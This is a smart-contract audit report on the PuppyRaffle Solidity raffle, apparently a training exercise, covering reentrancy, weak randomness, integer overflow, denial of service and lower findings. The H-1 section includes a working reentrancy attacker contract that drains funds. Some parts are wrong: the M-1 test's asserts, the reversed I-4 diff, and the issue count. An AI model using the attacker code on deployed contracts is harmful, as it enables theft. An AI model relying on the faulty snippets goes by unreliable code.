---
title: Protocol Audit Report
author: Venkaiah P
date: March 3, 2025
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries PuppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: Venkaiah P
Lead Auditors: 
- xxxxxxx

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Reentrancy attack in `PuppyRaffle::refund` function which will allow entrants to drain the contract funds.](#h-1-reentrancy-attack-in-puppyrafflerefund-function-which-will-allow-entrants-to-drain-the-contract-funds)
    - [\[H-2\] Weak randomness `PuppyRaffle::selectWinner` function allows users influence or predict the winner and influence or predict the puppy.](#h-2-weak-randomness-puppyraffleselectwinner-function-allows-users-influence-or-predict-the-winner-and-influence-or-predict-the-puppy)
    - [\[H-3\] Integer Overflow leads to `PuppyRaffle::selectwinner` looses fees.](#h-3-integer-overflow-leads-to-puppyraffleselectwinner-looses-fees)
  - [Medium](#medium)
    - [\[M-1\] Looping through players array checking for duplicates `PuppyRaffle::enterRaffle` function is potential denial of serive(Dos) attack, it causes new entrants lead to high fees.](#m-1-looping-through-players-array-checking-for-duplicates-puppyraffleenterraffle-function-is-potential-denial-of-serivedos-attack-it-causes-new-entrants-lead-to-high-fees)
    - [\[M-2\] Smart contract wallet raffle winners without a `fallback` or `receive` function will block the start of new contract.](#m-2-smart-contract-wallet-raffle-winners-without-a-fallback-or-receive-function-will-block-the-start-of-new-contract)
  - [Low](#low)
    - [\[L-1\] `PuppyRaffle::getActivePlayerIndex` function returns 0 for no-exisitng players and players at index 0,causing the player at idex 0 to think  they not entered the raffle.](#l-1-puppyrafflegetactiveplayerindex-function-returns-0-for-no-exisitng-players-and-players-at-index-0causing-the-player-at-idex-0-to-think--they-not-entered-the-raffle)
  - [Gas](#gas)
    - [\[G-1\] Unchanged state variables should be immutable or constant](#g-1-unchanged-state-variables-should-be-immutable-or-constant)
    - [\[G-2\] State variables in a loop shoud be cached](#g-2-state-variables-in-a-loop-shoud-be-cached)
  - [Informational](#informational)
    - [\[I-1\]: Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\]: Using outdated version of solidity is not recommended.](#i-2-using-outdated-version-of-solidity-is-not-recommended)
    - [\[I-3:\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[I-4\] `PuppyRaffle::selectWinner` function doesn't following CEI , it's not the best practice to maintian clean code.](#i-4-puppyraffleselectwinner-function-doesnt-following-cei--its-not-the-best-practice-to-maintian-clean-code)
    - [\[I-5\] Using 'magic" numbers is discouraged](#i-5-using-magic-numbers-is-discouraged)
    - [\[I-6\] state chanegs are missing events](#i-6-state-chanegs-are-missing-events)
    - [\[I-7\] `PuppyRaffle::_isActivePlayer` is never used and should be removed.](#i-7-puppyraffle_isactiveplayer-is-never-used-and-should-be-removed)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

- Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5
- In Scope:
## Scope 

```
./src/
#-- PuppyRaffle.sol
``` 
## Roles

Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 3                      |
| Low      | 1                      |
| Info     | 7                      |
| Gas      | 2                      |
| Total    | 16                     |
# Findings
## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` function which will allow entrants to drain the contract funds.


**Description:** `PuppyRaffle::refund` function doesn't follow the CEI (Checks , effects, Interactions) and a resuslt, enavle the participants to drain the funds.


`PuppyRaffle::refund` function , we first make external call to `msg.sender` address ,after this call only we are updating the `PuppyRaffle::players` array.




```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>      payable(msg.sender).sendValue(entranceFee);


@>      players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```


A player who entered into raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` fucntion again and claim another refudn this proccess will reach the untill funds get drained form the contract.


**Impact:** All fees paid by raffle by entrants will be stolen by malicious entrant.


**Proof Of Concept:**
1. User enter into raffle
2. Attacker set up a contact with the `fallback`/`receive` functions to call the `PuppyRaffle::refund` fucntion.
3. Attacker enter into raffle.
4. Attacker calls the `refund` function from their attacker contract , to drain the funds.


**Proof of Code:**


<details>
<summary>Code</summary>


Place the following in  `PuppyraffleTest.t.sol`
```javascript
  function test_reentrancyRefund() public{
        address[] memory players=new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value:entranceFee*players.length}(players);


        ReentrancyAttacker attackContractor=new ReentrancyAttacker(puppyRaffle);
        address attackUser=makeAddr('attackUser');
        vm.deal(attackUser,1 ether);


        uint256 startingAttackerBalance=address(attackContractor).balance;
        uint256 startingRaffleContatrctBalance=address(puppyRaffle).balance;


        console.log("startingAttackerBalance : ",startingAttackerBalance);
        console.log("startingRaffleContatrctBalance : ",startingRaffleContatrctBalance);


        vm.prank(attackUser);
        attackContractor.attacker{value:entranceFee}();


        uint256 endingAttackerBalance=address(attackContractor).balance;
        uint256 endingRaffleContatrctBalance=address(puppyRaffle).balance;


         console.log("endingAttackerBalance : ",endingAttackerBalance);
        console.log("endingRaffleContatrctBalance : ",endingRaffleContatrctBalance);
    }


Below contract also


contract ReentrancyAttacker{
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;


    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle=_puppyRaffle;
        entranceFee=puppyRaffle.entranceFee();
    }


    function attacker() public payable{
        address[] memory players=new address[](1);
        players[0]=address(this);
        puppyRaffle.enterRaffle{value:entranceFee}(players);
        attackerIndex=puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);  
    }


    function _stealMoney() internal{
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }


    fallback() external payable{
        _stealMoney();
    }


    receive() external payable{
        _stealMoney();
    }
   
}
   
```
</details>


**Recommended Mitigation:**To prevent this ,we should have update the `player` array before calling the external call.Additionall we should move emits up well.


```diff
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+        players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
 
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }




```


### [H-2] Weak randomness `PuppyRaffle::selectWinner` function allows users influence or predict the winner and influence or predict the puppy.


**Description:** Hashing of `msg.sender`,`block.timestamp` and `block.difficulty` together will generate predictable find numner.Predictable number is not a good random number, Malicious user can maniplate the number so that tey can easily select the winner for themselves.


**Note:** This Additionally means users could front-run this function and call `refund`, if they see they are not winner.


**Impact:**A Malicious user can change or manipulate the values , so that they can select the winner for themseleves and wiingin the `rarest` puppy.Making entire raflle worthless if it become a gas war  as to who wins the raffles.


**Proof of Concept:**
1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate.See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao).`block.difficuty` recently replaced with `prevrando`.
2. User can mine/manipulate their `msg.sendr` value to result in their address used to generate the winner!
3. User can revert the winner, if they don't like the winner or resulting puupy.


Using on-chain values as randomness seed is a [well-documented vector attack](https://medium.com/better-programming/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.


**Recommended-Mitigation:** Consider using cryptogtaphycally provable random number generator such as Chainlink VRF.


### [H-3] Integer Overflow leads to `PuppyRaffle::selectwinner` looses fees.


**Description:**In Solidity version prior to `0.8.0` integers were subjected to integer overflow.


```javascript
uint64 myVar=type(uint64).max;
// 18.446744073709551615


myVar=myVar+1
//return 0 leads to underflow or overflow


```


**Impact:** In `PuppyRaffle::selectwinner`,`totalFees` are accumulated for the `feeAddress` to collect later from `PuppyRaffle::withdrawFees`.However, if the `totalFees` variable overflows, the `feeAddress` may not to collect the correct amount of feee, leaving fees permaently stuck in contract.


**Proof Of Concept:**
1. We conclude raffle of 4 players
2. we then 89 new players enter into raflle, concluded the raffle
3. `totalFee` will be
```javascript
totalFees=totalFees+uint64(fee);
```
4. you will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`
    ```javascript
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");


    ```
Although you could use `sefldestruct` to send ETH to this contract in order to match the withdraw fees, this is clearly not the intended design of the protocol.At some point there will be too much `balance` in the contract that above `require` will be impossible to hit.
<details>
<summary>Code</summary>


```javascript
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000
        console.log(startingTotalFees);
        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);


        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();


        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);


        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```


</details>


**Recommened-Mitigation:** There are few recommenede mitagations:
1. Use a newer version of solidity , and instead of `uint64` use `uint256` for `PuppyRaffle::totalFees`
2. You could also use the `safeMath` library of Openzeppelin for version `0.7.6` of solidity.however you would have still hard time with the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdraFees`
```javascript
-           require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");


```
There are more attack vectors with that final require, so we recommend removing it regardless.




## Medium


### [M-1] Looping through players array checking for duplicates `PuppyRaffle::enterRaffle` function is potential denial of serive(Dos) attack, it causes new entrants lead to high fees.


**Description:** `PuppyRaffle::enterRaffle` function is loop throrugh the `players` array to check duplicate entrants not allowing into contract.
If `PuppyRaffle::players` array length is getting high , in this case new entrants  has top pay more gas fee in order to make more checks.
it will lead to `Dos` attack.


**Impact:** The gas costs for Raffle entrants significanlty increase , as more players enter in raffle.Discouraging later users from entering into raffle due high gas costs.


An attacker might make the `PuppyRaffle:players` array bigger , that no one entrants enter this make themsellves win chance are less.


```javascript
//audit - Dos Attack
for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```


**Proof of Concept:**


If we have 2 sets of 100 players, the gas costs will be vary form frist set another set as below:
-1st 100 entrants gas cost is ~ 6252128 gas
-2nd 100 entrants gas cost is ~ 18068218 gas


So here 2nd set of 100 players ags cost is more than the first set.


<details>
<summary>PoC</summary>
Place the follwoing test into `PuppyRaffle.t.sol`


```javascript


function test_DenailOfService() public{
        vm.txGasPrice(1);


        uint256 playerNum=100;
        address[] memory players=new address[](playerNum);
        for(uint256 i=0;i<playerNum;i++){
            players[i]=address(i);
        }
        //show how gas it cost
        uint256 gasStar=gasleft();
        puppyRaffle.enterRaffle{value:entranceFee*players.length}(players);
        uint256 gasEnd=gasleft();
        uint256 totalGasFirst=(gasStar-gasEnd)*tx.gasprice;
        console.log("Gas used for first 100",totalGasFirst);
        assert(gasStar < gasEnd);
        //Second 100 entires will check the gas
        address[] memory players2=new address[](playerNum);
        for(uint256 i=0;i<playerNum;i++){
            players2[i]=address(playerNum+i);
        }
        uint256 gasStart2=gasleft();
        puppyRaffle.enterRaffle{value:entranceFee*players2.length}(players2);
        uint256 gasEnd2=gasleft();
        uint256 finalGas2=(gasStart2-gasEnd2)*tx.gasprice;
        console.log("Gas used for Second 100",finalGas2);
        assert(gasStart2 < gasStart2);
    }


```


</details>


**Recommended Mitigation:**


1. Consider allowing dupilcates.Users can make new wallet address anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check, for duplicates.this will check wheather a user alredy entered or not.


```diff
+    mapping(address=>uint256) public addressToRaffleId;
+    uin256 public raffleId=0;




function enterRaffle(address[] memory newPlayers) public payable {
        // q were custome reverts a thing in 0.7.6 of solidity
        // what if its 0 players?
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]]=raffleId;
        }


-       // Check for duplicates
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
+       //Check for duplicates only from the new players.
+         for (uint256 i = 0; i < newPlayers.length; i++) {
+            require(addressToRaffleId[newPlayers[i]] !=raffleId,"PuppyRaffle: Duplicate Player");
+        }
        emit RaffleEnter(newPlayers);
    }
.
.
.


    function selectWinner() external {
+       raffleId = raffleId+1;        
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");




```


### [M-2] Smart contract wallet raffle winners without a `fallback` or `receive` function will block the start of new contract.


**Description:** `PuppyRaffle::selectWinner` function is responsible for the ressting the lottery.However if winner is a smart contract rejects payment, the lottery wouldn't be able to start.


Users could easily call the `PuppyRaffle::selectWinner`function again and non-wallet entrant could enter, but it could cost a lot due to the dupilcate check and a lottery reset could get very challenging.


**Impact:** `PuppyRaffle::selectWinner` function could revert many times,making a lottery reset difficult.
Also, true winners not get paid out and someone else could take their money!.


**Proof Of Code:**
1. 10 smart contract wallets enters into raffle lottery without a fallback or receive.
2. the lottery ends
3. The `selectWinner` function wouldn't work, even though the lotter is over!


**Recommended-Mitigation:**There are few options to mitigate this issue:
1. Don't allow smart contract wallets entrants(not recommended)
2. Create a mapping of address->payout so winners can pull their funds out themseleves with a new `claimPrize`,putting thr owness on the winner to claim their prize.(Recommended)


## Low


### [L-1] `PuppyRaffle::getActivePlayerIndex` function returns 0 for no-exisitng players and players at index 0,causing the player at idex 0 to think  they not entered the raffle.


**Descritpion:** if the player at index 0 at `PuppyRaffle::getActivePlayerIndex` function it returns 0 ,Accoridng to natspec it wll also return 0 for nor-existing players in `players` array.


```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (uint256) {
         for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```


**Impact:** A player at index 0 incorrectly think they have not the part of the raffle, causing them into entering into raffle again wasting of gas.


**Proof of Concpet:**
1. First entered entrant at index is 0.
2. As per the natspec `PuppyRaffle::getActivePlayerIndex` function it will return 0.
3. It leads to first entrant think that they might not be part of the raffle.


**Recommended-Mitigation:**Better to revert if the player or entrant not existed in the `player` array instead of returing 0.


## Gas

### [G-1] Unchanged state variables should be immutable or constant


Reading from state variables is much more expensive than reading from constant or immutabale variable.


Instances:
-`PuppyRaffle::raffleDuration` shold be `immutable`
-`PuppyRaffle::commonImageUri` shold be `constant`
-`PuppyRaffle::rareImageUri` shold be `constant`
-`PuppyRaffle::legendaryImageUri` shold be `constant`




### [G-2] State variables in a loop shoud be cached


`PuppyRaffle::Players` array is reading `state` variables everty time when we run `players.length` loop,which is opposed to memory more gas efficient.


```diff
+ uint256 playerNum=players.length
-for (uint256 i = 0; i < players.length - 1; i++) {
-          for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < playerNum; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }


```




## Informational

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`


<details><summary>1 Found Instances</summary>




- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)


    ```solidity
    pragma solidity ^0.7.6;
    ```


</details>




### [I-2]: Using outdated version of solidity is not recommended.


**Configuration**
Check: solc-version
Severity: Informational
Confidence: High
Description
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.


**Recommendation**
Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.


Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.


Please check [slither] https://github.com/crytic/slither/wiki/Detector-Documentation#dangerous-strict-equalities documentation for more information






### [I-3:] Missing checks for `address(0)` when assigning values to address state variables


Check for `address(0)` when assigning values to address state variables.


<details><summary>2 Found Instances</summary>




- Found in src/PuppyRaffle.sol [Line: 68](src/PuppyRaffle.sol#L68)


    ```solidity
            feeAddress = _feeAddress;
    ```


- Found in src/PuppyRaffle.sol [Line: 216](src/PuppyRaffle.sol#L216)


    ```solidity
            feeAddress = newFeeAddress;
    ```


</details>


### [I-4] `PuppyRaffle::selectWinner` function doesn't following CEI , it's not the best practice to maintian clean code.


```diff
+        (bool success,) = winner.call{value: prizePool}("");
+        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
-        (bool success,) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
```


### [I-5] Using 'magic" numbers is discouraged

It can be confusing to see the number literal in codebase.and its much more readable if names are given.


Examples:
```javascript
      uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```
```javascript
uint256 public constant PRIZE_POOL_PERCENTAGE=80;
uint256 public constant FEE_PERCENTAGE=20;
uint256 public constant POOL_PRECESION=100;


```


### [I-6] state chanegs are missing events




### [I-7] `PuppyRaffle::_isActivePlayer` is never used and should be removed.



